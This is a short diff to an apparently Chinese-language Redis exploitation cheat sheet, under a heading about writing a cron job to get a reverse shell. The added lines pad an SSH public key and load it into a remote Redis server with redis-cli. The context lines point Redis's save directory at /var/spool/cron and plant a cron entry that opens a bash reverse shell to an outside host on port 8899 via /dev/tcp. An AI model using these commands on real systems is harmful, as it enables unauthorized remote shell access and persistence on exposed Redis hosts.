@@ -36,6 +36,10 @@ save
 ```
 #### (2) 新建DB写文件->计划任务反弹shell
 ```
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > re.txt
+```
+```
+cat re.txt | redis-cli -h 192.168.1.11 -x set test
 config set dir /var/spool/cron
 set tide "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/8899 0>&1\n\n"
 config set dbfilename root
